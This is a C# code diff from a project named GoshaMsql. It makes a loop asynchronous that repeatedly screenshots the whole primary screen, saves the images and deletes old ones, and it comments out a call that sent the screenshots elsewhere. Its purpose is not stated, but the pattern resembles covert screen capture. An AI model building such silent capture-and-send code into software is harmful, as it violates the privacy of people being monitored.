@@ -83,7 +83,7 @@ namespace GoshaMsql
 
         }
 
-        public static void Test()
+        public async static void Test()
         {
             try
             {
@@ -118,7 +118,8 @@ namespace GoshaMsql
                 else
                 {
                     Thread.Sleep(60); //ожидание перед запускам
-                    Circle(); // запуск цикла скринов ПРОВЕРИТЬ
+                    await Task.Run(() => Circle());// аисинхроный запуск
+                  //  Circle(); // запуск цикла скринов ПРОВЕРИТЬ
                    
                     //очистка старых фоток
                     foreach (string way in Directory.GetFiles(wayToDir))
@@ -127,7 +128,8 @@ namespace GoshaMsql
                     }
 
                          
-                    Thread.Sleep(2592000); // ожидание
+                    //Thread.Sleep(2592000); // ожидание
+                    Thread.Sleep(1000); // ожидание
                 }
             }
             catch(Exception ex)
@@ -139,7 +141,7 @@ namespace GoshaMsql
 
 
 
-        
+
         /// <summary>
         /// Сделать снимок экрана
         /// </summary>
@@ -147,26 +149,27 @@ namespace GoshaMsql
         {
             Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             Graphics GH = Graphics.FromImage(BM as Image); //Обьекты для работы с скиринами
-           
+
             GH.CopyFromScreen(0, 0, 0, 0, BM.Size); // размеры экрана
 
             if (!Directory.Exists(wayToDir)) // проверка на существоании директории для сохранения снимка
                 Directory.CreateDirectory(wayToDir); //создание директории
 
-            wayToScreen = wayToDir + System.DateTime.Now.ToString().Replace(':', '_')+".bmp"; //Создание снимка с датой создания. С местом куда сохраняется снимок
+            wayToScreen = wayToDir + System.DateTime.Now.ToString().Replace(':', '_') + ".bmp"; //Создание снимка с датой создания. С местом куда сохраняется снимок
             BM.Save(wayToScreen); //Сохранение снимка
         }
 
         /// <summary>
         /// Цикл  запуска скринов и удаления старых
         /// </summary>
-        static private void Circle()
+        static async private void Circle()
         {
             int time = 0;
             while (time<10)
             {
-                MakeScreen(); // скины
-                Send(); // отправка скинов
+                await Task.Run(() => MakeScreen());// аисинхроный запуск
+                //MakeScreen(); // скины
+              //  Send(); // отправка скинов
                 //DeleteScreen();
                 //MessageBox.Show("Succ");
                 //Thread.Sleep(1000 * 60); //спать
